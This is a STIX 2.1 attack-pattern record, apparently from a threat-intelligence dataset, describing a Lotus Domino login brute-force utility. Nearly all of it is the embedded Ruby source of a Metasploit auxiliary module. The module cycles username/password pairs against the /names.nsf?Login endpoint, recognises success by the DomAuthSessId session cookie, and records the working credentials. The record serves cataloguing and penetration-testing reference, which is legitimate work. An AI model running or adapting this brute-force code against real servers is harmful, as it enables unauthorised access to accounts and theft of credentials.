{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7670deec-3923-4ee4-bc7b-082ff2e75179",
    "created": "2024-08-14T16:27:15.085496Z",
    "modified": "2024-08-14T16:27:15.0855Z",
    "name": "Lotus Domino Brute Force Utility",
    "description": "Lotus Domino Authentication Brute Force Utility",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/lotus/lotus_domino_login.rb",
            "external_id": "lotus_domino_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n\n  def initialize\n    super(\n      'Name'           => 'Lotus Domino Brute Force Utility',\n      'Description'    => 'Lotus Domino Authentication Brute Force Utility',\n      'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',\n      'License'        =>  MSF_LICENSE\n    )\n\n  end\n\n  def run_host(ip)\n\n    each_user_pass { |user, pass|\n      do_login(user, pass)\n    }\n\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user=nil,pass=nil)\n    post_data = \"username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf\"\n    vprint_status(\"http://#{vhost}:#{rport} - Lotus Domino - Trying username:'#{user}' with password:'#{pass}'\")\n\n    begin\n\n      res = send_request_cgi({\n        'method'  => 'POST',\n        'uri'     => '/names.nsf?Login',\n        'data'    => post_data,\n      }, 20)\n\n      if res and res.code == 302\n        if res.get_cookies.match(/DomAuthSessId=(.*);(.*)/i)\n          print_good(\"http://#{vhost}:#{rport} - Lotus Domino - SUCCESSFUL login for '#{user}' : '#{pass}'\")\n          report_cred(\n            ip: rhost,\n            port: rport,\n            service_name: (ssl ? \"https\" : \"http\"),\n            user: user,\n            password: pass,\n            proof: \"WEBAPP=\\\"Lotus Domino\\\", VHOST=#{vhost}, COOKIE=#{res.get_cookies}\"\n          )\n          return :next_user\n        end\n\n        print_error(\"http://#{vhost}:#{rport} - Lotus Domino - Unrecognized 302 response\")\n        return :abort\n\n      elsif res.body.to_s =~ /names.nsf\\?Login/\n        vprint_error(\"http://#{vhost}:#{rport} - Lotus Domino - Failed to login as '#{user}'\")\n        return\n      else\n        print_error(\"http://#{vhost}:#{rport} - Lotus Domino - Unrecognized #{res.code} response\") if res\n        return :abort\n      end\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}